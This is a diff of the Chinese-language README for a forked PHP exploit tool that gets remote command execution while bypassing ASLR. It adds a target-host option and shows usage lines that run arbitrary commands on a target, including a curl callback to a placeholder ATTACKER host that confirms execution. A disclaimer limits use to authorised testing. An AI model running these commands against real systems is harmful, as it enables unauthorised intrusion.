@@ -1,6 +1,6 @@
 # 写在前面
 
-本仓库 Fork 自 [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)，**主要新增了自定义目标 IP (`--host`) 的功能**，以便在跨主机（如宿主机打虚拟机靶场）环境下进行测试。核心漏洞利用链完全基于 9bie 师傅的代码，感谢9bie师傅
+本仓库 Fork 自 [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)，**主要新增了自定义目标 IP (`--host`) 的功能**，以便在跨主机（如宿主机打虚拟机靶场）环境下进行测试，同时更改docker配置为0.0.0.0。核心漏洞利用链完全基于 9bie 师傅的代码，感谢9bie师傅
 
 > **免责声明**：本项目仅供网络安全学习、漏洞原理研究与**已授权的环境测试**使用。请勿用于任何非法用途，否则后果自负。
 
@@ -75,11 +75,10 @@ python3 exploit.py --host 10.0.0.5 --port 80 --cmd 'id>/tmp/p1'
 
 # 拿不到本地 proof 文件时加 --no-verify：把三个 main-chunk 候选都打一遍，
 # 结果用带外方式（DNS/HTTP 回连或写 web 目录）确认
-python3 exploit.py --host 10.0.0.5 --port 80 \
-    --cmd 'curl -s http://ATTACKER/ok' --no-verify
+python3 exploit.py --host 10.0.0.5 --port 80 --cmd 'curl -s http://ATTACKER/ok' --no-verify
 
 # 命令较长或含引号/换行时，直接从文件读取（覆盖 --cmd）
-python3 exploit.py --host 10.0.0.5 --port 80 --cmd-file out/c --no-verify
+python3 exploit.py --host 10.0.0.5 --port 80 --workers 150 --retries 1 --no-verify --cmd-file out/c
 ```
 
 `--cmd` 走的是 384 字节 fake zend_array 载体，命令最长 200 字节（0x160-0x98）；
